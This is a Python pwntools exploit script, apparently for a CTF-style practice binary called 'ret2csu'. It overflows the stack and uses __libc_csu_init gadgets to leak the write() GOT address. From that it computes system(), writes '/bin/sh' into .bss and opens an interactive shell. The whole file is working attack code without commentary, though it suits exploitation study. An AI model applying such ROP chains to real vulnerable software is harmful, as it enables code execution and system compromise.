from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'

level5 = ELF('./ret2csu')
sh = process('./ret2csu')
#libc_ = level5.got['__libc_start_main']
#main = level5.symbols['main']
main = 0x400564
got_write = level5.got['write']
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

payload1 =  b"\x00"*136
payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload1 += b"\x00"*56
payload1 += p64(main)

sh.recvuntil("Hello, World\n")


print ("\n#############sending payload1#############\n")
sleep(2)
sh.send(payload1)

addr = u64(sh.recv(8))

#1
#base = addr - 0x29dc0
#sys_addr = base + 0x50d70

#2
sys_addr = addr - (libc.symbols['write'] - libc.symbols['system'])

#print ("system_addr1: " + hex(system_addr1))
got_read = level5.got['read']
bss_addr = 0x601028
payload2 =  b"\x00"*136
payload2 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload2 += b"\x00"*56
payload2 += p64(main)


sh.recvuntil("Hello, World\n")
print ("\n#############sending payload2#############\n")


sh.send(payload2)
sleep(2)
sh.send(p64(sys_addr))
sh.send("/bin/sh\0")

sh.recvuntil("Hello, World\n")

payload3 =  b"\x00"*136
payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
payload3 += b"\x00"*56
payload3 += p64(main)
print ("\n#############sending payload3#############\n")
sleep(2)
sh.send(payload3)
sh.interactive()
